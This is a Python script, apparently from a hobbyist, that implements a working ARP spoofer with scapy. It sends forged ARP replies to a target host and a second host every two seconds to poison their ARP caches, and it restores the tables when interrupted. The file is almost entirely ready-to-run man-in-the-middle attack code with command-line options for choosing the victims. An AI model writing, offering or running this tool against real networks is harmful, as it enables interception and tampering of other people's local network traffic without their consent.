#a simple Arp Spoofer using scapy library
import sys
import time
import argparse
#you may first try with skipping this line if you have scapy-python3 installed
sys.path.append(r'/usr/lib/python2.7/dist-packages/')
import scapy.all as scapy

def getMac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast_mac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast_mac = broadcast_mac/arp_req
    #srp returns two lists : (packets, answers) and (unanswered) but we select only [0] i.e (packets, answers)
    answered_list = scapy.srp(arp_req_broadcast_mac, timeout=3.0, verbose=False)[0]
    #[0] indicates the first element of the list i.e the first client which apparently is the only client whose ip we have passed to the function and [1] indicates the 'answers' part from (packets, answers)
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = getMac(target_ip)
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_packet, verbose=False)

def restoreOrgininalARP(dest_ip, src_ip):
    dest_mac = getMac(dest_ip)
    src_mac = getMac(src_ip)
    packet_to_restore_arp = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet_to_restore_arp, count=4, verbose=False)

def getArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target_ip", dest="target_ip", help="specify target ip")
    parser.add_argument("-s", "--spoof_ip", dest="spoof_ip", help="Specify spoof IP")
    options = parser.parse_args()
    if not options.target_ip:
        print("[-] specify a target IP, type --help for more info")
        exit(0)
    elif not options.spoof_ip:
        print("[-] specify spoof IP, type --help for more info")
        exit(0)
    else:
        return options

options = getArgs()
sent_packets_count = 0
try:
    while True:
        spoof(options.target_ip, options.spoof_ip)
        spoof(options.spoof_ip, options.target_ip)
        sent_packets_count+=2
        print("\r[+] Packets sent: ", str(sent_packets_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("[-] Restoring original arp tables...Please wait\n")
    restoreOrgininalARP(options.target_ip, options.spoof_ip)
    restoreOrgininalARP(options.spoof_ip, options.target_ip)
    print("\n[X] Terminating Now")
